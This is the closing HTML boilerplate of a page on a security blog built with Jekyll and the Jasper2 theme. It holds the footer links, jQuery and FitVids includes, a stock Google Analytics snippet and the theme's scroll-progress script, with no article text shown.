            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>

        </a>
    </div>
    <progress class="progress" value="0">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


<!-- /post -->

<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->


        <!-- Previous/next page links - displayed on every page -->
        

        <!-- The footer at the very bottom of the screen -->
        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright"><a href="/">Securityits.io</a> &copy; 2025</section>
                <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &
                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
                    <a href="https://github.com/jekyllt/jasper2" target="_blank" rel="noopener">Jasper2</a></section>
                <nav class="site-footer-nav">
                    <a href="/">Latest Posts</a>
                    
                    <a href="https://twitter.com/Securitybits_io" target="_blank" rel="noopener">Twitter</a>
                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
                </nav>
            </div>
        </footer>

    </div>

    <!-- The big email subscribe modal content -->
    

    <!-- highlight.js -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
    <script>$(document).ready(function() {
      $('pre code').each(function(i, block) {
        hljs.highlightBlock(block);
      });
    });</script>

    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
    <script
        src="https://code.jquery.com/jquery-3.2.1.min.js"
        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
        crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>


    <!-- Paginator increased to "infinit" in _config.yml -->
    <!-- if paginator.posts  -->
    <!-- <script>
        var maxPages = parseInt('');
    </script>
    <script src="/assets/js/infinitescroll.js"></script> -->
    <!-- /endif -->

    


    <!-- Add Google Analytics  -->
    <!-- Google Analytics Tracking code -->
 <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-115328400-1', 'auto');
  ga('send', 'pageview');

 </script>


    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
    
        <script>

// NOTE: Scroll performance is poor in Safari
// - this appears to be due to the events firing much more slowly in Safari.
//   Dropping the scroll event and using only a raf loop results in smoother
//   scrolling but continuous processing even when not scrolling
$(document).ready(function () {
    // Start fitVids
    var $postContent = $(".post-full-content");
    $postContent.fitVids();
    // End fitVids

    var progressBar = document.querySelector('progress');
    var header = document.querySelector('.floating-header');
    var title = document.querySelector('.post-full-title');

    var lastScrollY = window.scrollY;
    var lastWindowHeight = window.innerHeight;
    var lastDocumentHeight = $(document).height();
    var ticking = false;

    function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
    }

    function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
    }

    function requestTick() {
        if (!ticking) {
            requestAnimationFrame(update);
        }
        ticking = true;
    }

    function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
            header.classList.add('floating-active');
        } else {
            header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
    }

    window.addEventListener('scroll', onScroll, {passive: true});
    window.addEventListener('resize', onResize, false);

    update();
});
</script>

    

    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
    <!-- ghost_foot -->

</body>
</html>
